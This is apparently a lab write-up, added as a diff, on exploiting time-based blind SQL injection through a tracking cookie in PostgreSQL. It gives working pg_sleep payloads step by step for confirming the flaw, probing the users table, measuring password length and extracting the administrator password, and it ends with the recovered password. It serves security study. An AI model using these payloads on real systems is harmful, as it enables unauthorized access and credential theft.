@@ -1,0 +1,30 @@
+Blind SQLi with time delays and informational retrieval
+
+Vulnerable parameter - tracking cookie
+
+Goals:
+- Exploit time-based blind SQLi to output the administrator password
+- Login as the administrator user
+
+Analysis:
+---------
+
+==========Step 1: Confirm that the parameter is vulnerable to SQLi==========
+' || pg_sleep(10)--
+
+==========Step 2: Confirm that the users table exists in the database==========
+' || (select case when (1=0) then pg_sleep(10) else pg_sleep(-1) end)--
+-> Confirms that we can run arbitrary code
+-> It does not cause a time delay
+
+' || (select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users)--
+-> It causes a time delay, so it confirms that the username administrator exists in the users table.
+
+==========Step 3: Enumerate the password length==========
+' || (select case when (username='administrator' and LENGTH(password)>20) then pg_sleep(10) else pg_sleep(-1) end from users)--
+-> length of password is 20 characters
+
+==========Step 4: Enumerate the administrator password==========
+' || (select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(10) else pg_sleep(-1) end from users)--
+
+hrhfnxet3gzvhhrvqepk
